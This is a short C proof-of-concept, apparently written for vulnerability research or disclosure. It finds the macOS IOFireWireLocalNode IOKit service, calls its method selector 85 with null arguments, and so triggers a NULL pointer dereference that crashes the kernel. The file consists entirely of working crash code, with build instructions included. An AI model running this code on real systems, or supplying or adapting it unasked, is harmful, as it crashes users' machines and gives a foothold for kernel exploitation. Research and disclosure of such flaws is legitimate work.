/*
  Triggers a NULL pointer dereference invoking selector #85 of
  IOFireWireFamily. Compile with:
    clang -Wall -o IOFireWireFamily-crash2{,.c} -framework IOKit

  Authors: @rpaleari and @joystick
 */

#include <stdio.h>
#include <assert.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

#include <IOKit/IOKitLib.h>

bool find_service(const char *target_name, io_connect_t *ptarget_port) {
  io_iterator_t iter;
  kern_return_t r =
    IOServiceGetMatchingServices(kIOMasterPortDefault,
				 IOServiceMatching("IOService"), &iter);

  if (r != KERN_SUCCESS) {
    fprintf(stderr, " [!] IOServiceGetMatchingServices() failed\n");
    return -1;
  }

  io_object_t service;
  while ((service = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
    /* Get service name */
    io_name_t name;
    r = IORegistryEntryGetName(service, name);
    if (r != KERN_SUCCESS) {
      fprintf(stderr, " [!] IORegistryEntryGetName() failed\n");
      IOObjectRelease(service);
      continue;
    }

    io_string_t path;
    r = IORegistryEntryGetPath(service, "IOService", path);

    /* Try to open service */
    io_connect_t port = (io_connect_t) 0;
    r = IOServiceOpen(service, mach_task_self(), 0, &port);
    IOObjectRelease(service);
    if (r != kIOReturnSuccess) {
      continue;
    }

    if (strstr(name, target_name)) {
      printf(" [+] Found service %s\n", name);
      *ptarget_port = port;
      return true;
    }

    IOServiceClose(port);
  }

  return false;
}

int main(int argc, char **argv) {
  io_connect_t port;

  bool bSuccess = find_service("IOFireWireLocalNode", &port);
  assert(bSuccess);

  printf(" [+] Opened connection to service on port: %d\n", port);

  kern_return_t kr =
    IOConnectCallMethod((mach_port_t) port,
			(uint32_t) 85,
			NULL, 0,
			NULL, 0,
			NULL, NULL,
			NULL, NULL);

  printf("kr: %08x\n", kr);

  return IOServiceClose(port);
}
